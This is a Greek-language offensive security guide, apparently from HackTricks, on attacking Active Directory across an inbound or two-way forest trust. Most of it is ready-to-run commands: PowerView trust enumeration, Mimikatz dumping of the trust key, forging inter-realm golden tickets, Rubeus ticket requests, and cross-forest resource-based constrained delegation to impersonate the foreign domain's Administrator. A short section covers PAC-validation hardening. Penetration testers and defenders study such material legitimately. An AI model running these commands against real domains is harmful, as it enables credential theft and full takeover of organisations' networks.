# Εξωτερικό Forest Domain - OneWay (Inbound) ή αμφίδρομη

{{#include ../../banners/hacktricks-training.md}}

Σε αυτό το σενάριο ένα εξωτερικό domain σας εμπιστεύεται (ή και τα δύο εμπιστεύονται το ένα το άλλο), οπότε μπορείτε να αποκτήσετε κάποιο είδος πρόσβασης σε αυτό.

## Καταγραφή

Πρώτα απ' όλα, πρέπει να **καταγράψετε** την **εμπιστοσύνη**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` σας επιτρέπουν να δείτε γρήγορα αν τα cross-forest abuse paths (RBCD, SIDHistory) είναι πιθανό να λειτουργήσουν χωρίς επιπλέον προαπαιτούμενα.

Στην προηγούμενη enumeration βρέθηκε ότι ο χρήστης **`crossuser`** είναι μέσα στην ομάδα **`External Admins`** που έχει **Admin access** μέσα στον **DC του external domain**.

## Αρχική Πρόσβαση

Αν **δεν** καταφέρατε να βρείτε κάποια **ειδική** πρόσβαση του χρήστη σας στο άλλο domain, μπορείτε ακόμα να επιστρέψετε στην AD Methodology και να δοκιμάσετε να κάνετε **privesc from an unprivileged user** (πράγματα όπως kerberoasting για παράδειγμα):

Μπορείτε να χρησιμοποιήσετε τις **Powerview functions** για να κάνετε **enumerate** το **other domain** χρησιμοποιώντας την παράμετρο `-Domain` όπως σε:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Προσποίηση ταυτότητας

### Σύνδεση

Χρησιμοποιώντας μια κανονική μέθοδο με τα διαπιστευτήρια των χρηστών που έχουν πρόσβαση στο external domain θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση σε:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Κατάχρηση SID History

Μπορείτε επίσης να καταχραστείτε [**SID History**](sid-history-injection.md) σε ένα forest trust.

Εάν ένας χρήστης μεταφερθεί **από ένα forest σε άλλο** και το **SID Filtering δεν είναι ενεργοποιημένο**, γίνεται δυνατή η **προσθήκη ενός SID από το άλλο forest**, και αυτό το **SID** θα **προστεθεί** στο **token του χρήστη** κατά την αυθεντικοποίηση **μέσω του trust**.

> [!WARNING]
> Ως υπενθύμιση, μπορείτε να αποκτήσετε το κλειδί υπογραφής με
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Μπορείτε να **υπογράψετε με** το **έμπιστο** κλειδί ένα **TGT που υποδύεται** τον χρήστη του τρέχοντος domain.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Πλήρης μέθοδος προσποίησης χρήστη
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD όταν ελέγχετε έναν λογαριασμό υπολογιστή στο trusting forest (no SID filtering / selective auth)

Εάν ο foreign principal (FSP) σας τοποθετηθεί σε μια ομάδα που μπορεί να γράψει αντικείμενα υπολογιστών στο trusting forest (π.χ., `Account Operators`, προσαρμοσμένη provisioning ομάδα), μπορείτε να ρυθμίσετε **Resource-Based Constrained Delegation** σε έναν host-στόχο αυτού του forest και να προσποιηθείτε οποιονδήποτε χρήστη εκεί:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Αυτό λειτουργεί μόνο όταν **SelectiveAuthentication is disabled** και **SID filtering** δεν απομακρύνει το controlling SID σας. Πρόκειται για μια γρήγορη lateral path που αποφεύγει το SIDHistory forging και συχνά παραβλέπεται σε trust reviews.

### Σκληροποίηση επικύρωσης PAC

Οι ενημερώσεις επικύρωσης υπογραφής PAC για **CVE-2024-26248**/**CVE-2024-29056** προσθέτουν επιβολή υπογραφής στα inter-forest tickets. Σε **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths μπορούν ακόμα να λειτουργήσουν σε unpatched DCs. Σε **Enforcement mode**, unsigned ή παραποιημένα PAC δεδομένα που διασχίζουν ένα forest trust απορρίπτονται, εκτός αν κατέχετε και το target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) μπορούν να αδυνατίσουν αυτό όσο παραμένουν διαθέσιμες.

## Αναφορές

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
